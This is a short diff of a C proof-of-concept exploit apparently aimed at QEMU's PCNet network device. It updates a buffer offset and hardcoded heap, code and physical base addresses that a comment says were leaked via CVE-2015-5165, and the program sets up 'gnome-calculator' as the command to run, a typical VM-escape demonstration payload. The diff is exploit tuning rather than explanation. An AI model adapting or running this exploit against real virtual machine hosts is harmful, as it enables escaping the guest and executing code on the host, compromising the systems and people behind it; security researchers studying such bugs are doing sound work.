@@ -273,7 +273,7 @@ void pcnet_packet_send(struct pcnet_desc *desc, void *buffer,
 	}
 }
 
-#define BUFFER_OFFSET 0xffffffff
+#define BUFFER_OFFSET 0x11fb5d0
 
 int main()
 {
@@ -298,9 +298,9 @@ int main()
 	}
   
   //leaked address from CVE-2015-5165
-	heapBaseAddr = 0x5b1b204ff000;
-	uint64_t text_base = 0x5b1b1e7b7000;
-	uint64_t phy_base = 0x7b09a4000000;
+	heapBaseAddr = 0x5f41dc97b000;
+	uint64_t text_base = 0x5f41da3a8000;
+	uint64_t phy_base = 0x7592e8000000;
 	uint64_t *packet_ptr;
 	char* str = malloc(0x10);
 	strcpy(str, "gnome-calculator");
